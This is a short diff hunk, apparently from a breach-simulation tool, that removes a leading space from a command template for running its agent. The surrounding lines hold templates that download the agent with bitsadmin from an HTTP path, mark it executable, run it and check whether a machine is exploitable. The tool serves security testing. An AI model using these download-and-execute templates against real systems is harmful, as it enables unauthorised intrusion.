@@ -39,7 +39,7 @@ BITSADMIN_CMDLINE_HTTP = (
     "bitsadmin /transfer Update /download /priority high %(http_path)s %(monkey_path)s"
 )
 CHMOD_MONKEY = "chmod +x %(monkey_path)s"
-RUN_MONKEY = " %(monkey_path)s %(monkey_type)s %(parameters)s"
+RUN_MONKEY = "%(monkey_path)s %(monkey_type)s %(parameters)s"
 # Commands used to check for architecture and if machine is exploitable
 CHECK_COMMAND = "echo %s" % ID_STRING
 # Architecture checking commands
